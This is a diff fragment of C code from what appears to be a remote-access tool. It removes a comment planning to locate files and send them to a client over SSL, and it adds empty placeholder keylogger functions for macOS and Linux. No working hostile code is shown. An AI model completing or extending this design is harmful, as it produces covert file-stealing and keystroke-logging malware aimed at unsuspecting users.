@@ -38,14 +38,6 @@ void executeSystemCall(char *command)
     close(socket);
 }
 
-/*
- First run the system command "updatedb" to build the database of all files,
- then run "locate FILENAME" and store the results in a buffer. Either we just
- take the first result, or we iterrate through all the files listed? Either way
- we open the file and send it back over to the client via SSL. Running this
- command requires the popen command. Should make use of the executeSystemCall()
- function.
-*/
 void retrieveFile(char *fileName)
 {
     int socket = 0;
@@ -90,7 +82,14 @@ void retrieveFile(char *fileName)
 
 void keylogger()
 {
+#ifdef __APPLE__
+    // Apple keylogger code will go here
     
+#endif
+#ifdef __linux__
+    // Linux keylogger code will go here
+    
+#endif
 }
 
 int sendBuffer(int socket, char *buffer, int length)
